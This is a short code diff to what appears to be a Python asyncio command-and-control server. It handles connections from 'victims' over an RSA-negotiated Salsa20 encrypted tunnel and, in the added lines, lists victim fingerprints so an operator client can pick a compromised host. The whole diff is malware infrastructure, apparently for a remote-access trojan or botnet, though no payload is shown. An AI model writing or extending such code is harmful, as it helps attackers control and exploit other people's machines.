@@ -30,7 +30,8 @@ async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     await w.drain()
 
     # Gets the RSA-encrypted string containing the key and nonce
-    # splits the string using '<SPR>' as the separator
+    # Decompress the packet with zlib
+    # Splits the string using '<SPR>' as the separator
     key, nonce = zlib.decompress(rsa.decrypt(await r.read(BUFSIZE), private_key)).split(b"<SPR>")
 
     # Initializes the 'EncryptedTunnel' class that allows communication with the client using Salsa20,
@@ -58,8 +59,19 @@ async def handle_clients(r: asyncio.streams.StreamReader, w: asyncio.streams.Str
     del(public_key)
 
     username = await enctunnel.recv(BUFSIZE)
+
+    print(username)
     
     CLIENTS[username.decode()] = (w, r)
+    victims_fingerprints = {}
+
+    for victim in VICTIMS:
+        victims_fingerprints[VICTIMS[victim][0]] = victim
+
+    await enctunnel.send(b"\n".join(victims_fingerprints))
+
+    choosed_fingerprint = victims_fingerprints[await enctunnel.recv(BUFSIZE)]
+    print(victims_fingerprints, choosed_fingerprint)
 
 async def run_forever(server):
     async with server:
